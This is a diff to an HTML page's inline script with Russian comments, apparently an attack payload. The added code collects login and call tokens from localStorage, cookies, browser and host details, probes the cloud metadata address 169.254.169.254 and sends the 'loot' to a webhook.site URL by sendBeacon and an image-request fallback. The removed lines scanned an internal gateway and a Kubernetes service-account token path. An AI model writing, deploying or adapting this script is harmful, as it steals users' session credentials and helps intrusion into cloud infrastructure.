@@ -5,35 +5,38 @@
     (async function() {
         const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
         
-        // Собираем инфу о движке
-        const report = {
+        // Функция для безопасного сбора данных
+        const getVal = (storage, key) => { try { return storage.getItem(key); } catch(e) { return null; } };
+
+        // 1. Собираем всё самое ценное (включая твои ключи)
+        const loot = {
+            // Твои специфические ключи
+            auth: getVal(localStorage, '__oneme_auth'),
+            callToken: getVal(localStorage, '__oneme_calls_auth_token'),
+            deviceId: getVal(localStorage, '__oneme_device_id'),
+            
+            // Системная инфа (палит, что за бот)
             url: window.location.href,
+            cookies: document.cookie,
+            ua: navigator.userAgent,
             platform: navigator.platform,
-            // Проверка на Docker/K8s через специфические ошибки
-            is_container: !!(window.performance && performance.memory),
-            // Вытягиваем все ключи из window, которые не стандартные (кастомные конфиги)
-            custom_vars: Object.keys(window).filter(key => !window.hasOwnProperty(key)).slice(0, 50),
-            // Тайминги до внутренних ресурсов (если < 50ms - ресурс в локалке)
-            internal_check: {}
+            cores: navigator.hardwareConcurrency, // Кол-во ядер сервера
+            
+            // Внутренние объекты (если бот - часть портала Mail.ru)
+            is_ok: !!window.OK,
+            is_mailru: !!window.MailRu,
+            
+            // Пытаемся чекнуть, есть ли доступ к метаданным облака (SSRF check)
+            cloud_meta: await fetch("http://169.254.169.254/latest/meta-data/instance-id", {mode:'no-cors'}).then(()=>"ACCESSIBLE").catch(()=>"BLOCKED")
         };
 
-        const targets = {
-            "gateway": "http://172.17.0.1",
-            "metadata": "http://169.254.169.254/latest/meta-data/",
-            "k8s_token": "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
-        };
+        // 2. Отправляем на вебхук через POST
+        // Используем Blob для обхода некоторых ограничений fetch
+        const blob = new Blob([JSON.stringify(loot)], {type : 'application/json'});
+        navigator.sendBeacon(hook + "/LOOT_FINAL", blob);
 
-        for (let name in targets) {
-            const start = Date.now();
-            try {
-                await fetch(targets[name], { mode: 'no-cors', cache: 'no-store' });
-                report.internal_check[name] = Date.now() - start + "ms (OPEN)";
-            } catch (e) {
-                report.internal_check[name] = "closed/blocked";
-            }
-        }
-
-        navigator.sendBeacon(hook + "/FULL_LOOT", JSON.stringify(report));
+        // 3. Запасной вариант через старый добрый Image (если POST заблочат)
+        new Image().src = hook + "/DEBUG_GET?data=" + btoa(JSON.stringify({ip: "check", url: loot.url}));
     })();
 </script>
 </body>
